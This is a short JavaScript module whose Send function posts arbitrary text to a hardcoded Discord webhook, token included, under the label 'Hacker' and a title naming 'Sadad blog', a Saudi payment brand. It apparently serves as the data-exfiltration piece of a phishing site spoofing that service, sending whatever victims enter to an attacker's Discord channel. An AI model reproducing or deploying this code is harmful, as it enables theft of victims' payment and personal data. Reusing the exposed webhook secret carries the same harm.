import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328485102782517348/x9NBA-OGMd5DbWfpRh7nvOGjpNWjr3IY2bfJuH7H404CvJ9IvD56DPk_wzqKSkNItbTq",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
